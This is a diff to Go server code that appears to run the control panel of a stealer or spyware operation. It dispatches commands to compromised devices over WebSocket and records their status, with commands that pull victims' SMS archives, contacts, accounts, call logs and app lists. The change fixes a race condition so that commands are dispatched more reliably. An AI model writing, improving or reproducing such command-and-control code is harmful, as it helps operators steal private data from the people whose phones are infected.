@@ -68,14 +68,18 @@ func HandlePanelCommand(w http.ResponseWriter, r *http.Request) {
 		"params":     params,
 		"payload":    paramsJSON,
 	}
+	// Mark as sent BEFORE pushing over WS so the hub sees status='sent'
+	// when the device result arrives, even if it arrives before this goroutine
+	// resumes after WriteMessage returns.
+	d := ws.H.GetDevice(deviceID)
+	if d != nil {
+		db.DB.Exec("UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?",
+			time.Now().UTC().Format("2006-01-02 15:04:05"), cmdID)
+	}
 	sent := ws.H.SendToDevice(deviceID, wsMsg)
-
-	if sent {
-		db.DB.Exec("UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?", time.Now().UTC().Format("2006-01-02 15:04:05"), cmdID)
-		d := ws.H.GetDevice(deviceID)
-		if d != nil && !d.IsStealer {
-			ws.H.SendToDevice(deviceID, map[string]any{"type": "check_commands"})
-		}
+	if !sent && d != nil {
+		// WS write failed after we already marked sent — roll back to pending.
+		db.DB.Exec("UPDATE commands SET status = 'pending', sent_at = NULL WHERE id = ?", cmdID)
 	}
 
 	action := ActionSendCommand
@@ -322,12 +326,4 @@ func generateCmdID() string {
 	return hex.EncodeToString(b)
 }
 
-func isHTTPOnlyCommand(cmd string) bool {
-	switch cmd {
-	case "get_apps", "apps_list", "get_sms_archive", "get_sms",
-		"get_contacts", "get_accounts", "get_call_log":
-		return true
-	}
-	return false
-}
 
